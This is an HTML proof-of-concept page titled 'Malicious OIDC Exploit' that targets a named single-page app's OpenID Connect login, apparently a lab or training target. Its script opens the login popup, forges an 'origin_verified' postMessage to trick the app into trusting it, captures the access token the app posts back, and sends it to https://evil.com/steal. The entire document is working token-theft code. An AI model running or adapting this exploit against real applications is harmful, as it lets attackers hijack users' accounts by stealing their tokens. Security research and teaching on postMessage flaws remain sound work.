<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Malicious OIDC Exploit</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        #tokenLog { margin-top: 1em; padding: 1em; background: #f0f0f0; border: 1px solid #ccc; }
    </style>
</head>
<body>
    <h1>Malicious OIDC Exploit</h1>
    <p>Click the button to start the attack:</p>
    <button id="stealTokenBtn">Steal the Victim’s Token</button>

    <h2>Captured Token/Response:</h2>
    <div id="tokenLog">(none yet)</div>

    <script>
        // 1️⃣ Open the real SPA login flow
        const authorizeUrl = `https://sp-elearning.cloud.nds.rub.de/oidc_sp/spa-app/?sp_verifier=spa-v5&sp_id=spa-1`;
        let popupWindow;

        document.getElementById("stealTokenBtn").addEventListener("click", () => {
            popupWindow = window.open(authorizeUrl, "_blank", "width=800,height=600");

            // 2️⃣ Send fake `origin_verified` before the real SPA does
            setTimeout(() => {
                if (popupWindow) {
                    popupWindow.postMessage({ jsonrpc: "2.0", method: "origin_verified" }, "*");
                    console.log("[Attack] Sent fake `origin_verified` to SPA.");
                }
            }, 2000);
        });

        // 3️⃣ Listen for `postMessage()` responses from the SPA
        window.addEventListener("message", function (event) {
            console.log("[Attack] Intercepted Message:", event);

            // If we receive an access token, capture it
            if (event.data.tokens?.accessToken?.value) {
                const token = event.data.tokens.accessToken.value;
                document.getElementById("tokenLog").textContent = `Stolen Token: ${token}`;

                // Exfiltrate to attacker's server
                fetch("https://evil.com/steal", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ accessToken: token })
                });
            }
        });
    </script>
</body>
</html>
